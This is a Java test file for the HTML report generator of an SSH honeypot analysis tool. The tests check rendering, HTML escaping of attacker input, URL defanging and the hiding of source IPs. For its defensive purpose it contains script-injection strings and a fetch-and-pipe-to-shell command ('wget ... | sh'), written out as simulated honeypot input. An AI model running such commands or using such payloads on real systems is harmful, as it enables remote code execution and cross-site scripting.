package com.honeytrace.report;

import com.honeytrace.detection.Alert;
import com.honeytrace.detection.DetectionRule;
import com.honeytrace.detection.RuleSet;
import com.honeytrace.parser.CowrieEvent;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;
import java.util.Optional;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class HtmlReportTest {

    // 203.0.113.0/24 is a documentation range, so these are not real attacker IPs.
    private static CowrieEvent event(String type, String ip, String user, String pass,
                                     String input, String file, String sha, String time) {
        return new CowrieEvent(type, "s-" + ip, ip, 4000, time, user, pass, input, null, file, sha);
    }

    private static List<Alert> alertsFor(List<CowrieEvent> events) {
        List<DetectionRule> rules = RuleSet.defaults();
        return events.stream()
                .flatMap(e -> rules.stream().map(r -> r.evaluate(e)))
                .flatMap(Optional::stream)
                .toList();
    }

    private static final String T1 = "2026-10-08T10:00:00.000000Z";
    private static final String T2 = "2026-10-10T22:30:00.000000Z";

    @Test
    void rendersCardsChartsAndTables() {
        List<CowrieEvent> events = List.of(
                event("cowrie.session.connect", "203.0.113.7", null, null, null, null, null, T1),
                event("cowrie.session.connect", "203.0.113.8", null, null, null, null, null, T2),
                event("cowrie.login.success", "203.0.113.7", "root", "123456", null, null, null, T1),
                event("cowrie.command.input", "203.0.113.7", null, null, "uname -a", null, null, T1),
                event("cowrie.session.file_upload", "203.0.113.7", null, null, null, "sshd",
                        "a".repeat(64), T2));

        String html = HtmlReport.render(events, alertsFor(events), Map.of());

        assertTrue(html.startsWith("<!doctype html>"));
        assertTrue(html.contains("Sessions per day"));
        assertTrue(html.contains("<svg"));
        assertTrue(html.contains("Top usernames tried"));
        assertTrue(html.contains("HT-001"));
        assertTrue(html.contains("https://attack.mitre.org/techniques/T1082/"));
        assertTrue(html.contains("virustotal.com/gui/file/" + "a".repeat(64)));
        assertFalse(html.contains("Sessions by country"));
    }

    @Test
    void attackerTextIsEscapedAndNoScriptIsEverEmitted() {
        List<CowrieEvent> events = List.of(
                event("cowrie.login.success", "203.0.113.7", "<script>alert(1)</script>", "\"><img src=x>",
                        null, null, null, T1),
                event("cowrie.command.input", "203.0.113.7", null, null, "echo <b>hi</b> & id", null, null, T1));

        String html = HtmlReport.render(events, alertsFor(events), Map.of());

        assertFalse(html.contains("<script"));
        assertFalse(html.contains("<img src=x>"));
        assertFalse(html.contains("<b>hi</b>"));
        assertTrue(html.contains("&lt;script&gt;alert(1)&lt;/script&gt;"));
    }

    @Test
    void urlsInCommandsAreDefanged() {
        List<CowrieEvent> events = List.of(
                event("cowrie.command.input", "203.0.113.7", null, null,
                        "wget http://203.0.113.9/x.sh -O- | sh", null, null, T1));

        String html = HtmlReport.render(events, alertsFor(events), Map.of());

        assertTrue(html.contains("hxxp://203.0.113.9/x.sh"));
        assertFalse(html.contains("http://203.0.113.9"));
    }

    @Test
    void sourceIpAddressesAreNeverShown() {
        List<CowrieEvent> events = List.of(
                event("cowrie.session.connect", "203.0.113.7", null, null, null, null, null, T1),
                event("cowrie.login.success", "203.0.113.7", "root", "x", null, null, null, T1));

        String html = HtmlReport.render(events, alertsFor(events), Map.of("203.0.113.7", "Testland"));

        assertFalse(html.contains("203.0.113.7"));
    }

    @Test
    void countrySectionAndAttributionAppearWhenGeoDataIsGiven() {
        List<CowrieEvent> events = List.of(
                event("cowrie.session.connect", "203.0.113.7", null, null, null, null, null, T1),
                event("cowrie.session.connect", "203.0.113.8", null, null, null, null, null, T2));

        String html = HtmlReport.render(events, List.of(),
                Map.of("203.0.113.7", "Testland", "203.0.113.8", "Unknown"));

        assertTrue(html.contains("Sessions by country"));
        assertTrue(html.contains("Testland"));
        assertTrue(html.contains("IP Geolocation by DB-IP"));
    }

    @Test
    void emptyInputStillProducesAValidPage() {
        String html = HtmlReport.render(List.of(), List.of(), Map.of());

        assertTrue(html.contains("HoneyTrace findings"));
        assertTrue(html.contains("No alerts."));
        assertTrue(html.trim().endsWith("</html>"));
    }
}
